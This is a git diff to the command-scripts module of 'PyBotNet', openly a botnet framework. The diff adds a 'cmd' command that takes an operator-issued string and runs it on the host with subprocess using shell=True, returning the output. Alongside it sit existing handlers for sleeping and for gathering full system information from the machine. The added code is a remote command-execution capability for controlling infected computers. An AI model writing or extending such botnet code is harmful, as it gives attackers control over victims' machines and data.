@@ -1,21 +1,27 @@
 '''Defult PyBotNet scripts'''
 
 from time import sleep
+from subprocess import check_output
 
-
+# pybotnet import
 import util
 
 scripts_name = {
     "do_sleep": 'do_sleep <scconds> <message>',
-    "get_info": 'get_info'
+    "get_info": 'get_info',
+    "cmd": 'cmd <command>'
 }
 
 
-def get_command_name(command):
+def get_command_name(command) -> str:
     return command.split(' ')[0]
 
 
-def is_command(command):
+def split_command(command) -> list:
+    return command.split(' ')
+
+
+def is_command(command) -> bool:
     command_name = get_command_name(command)
     if command_name in scripts_name:
         return True
@@ -32,12 +38,15 @@ def execute_scripts(command, pybotnet_up_time, logger):
         elif command_name == 'get_info':
             return get_info(pybotnet_up_time, logger)
 
+        elif command_name == 'cmd':
+            return execute_cmd(command, logger)
+
     logger.error('invalid command; Wrong format')
     return 'invalid command; Wrong format'
 
 
 def execute_do_sleep(command, logger):
-    comm = command.split(' ')
+    comm = split_command(command)
     try:
         do_sleep(seconds=comm[1], logger=logger, sleep_message=comm[2])
         logger.info('do_sleep done')
@@ -62,3 +71,25 @@ def do_sleep(seconds, logger, sleep_message=''):
 def get_info(pybotnet_up_time, logger):
     logger.info('return system info')
     return util.get_full_system_info(pybotnet_up_time)
+
+
+def execute_cmd(command, logger) -> str:
+    try:
+        command = split_command(command)
+        command = command[1:]
+    except:
+        return 'execute_cmd invalid command; Wrong format'
+
+    try:
+        return cmd(command, logger=logger)
+    except:
+        return 'cmd error'
+
+
+def cmd(cmd,  logger) -> str:
+    logger.info(f'try to run: {cmd}')
+
+    output = check_output(cmd, shell=True)
+    return str(output).replace('\\r\\n', '\n')  # cleaning data
+
+    # TODO: add timeout
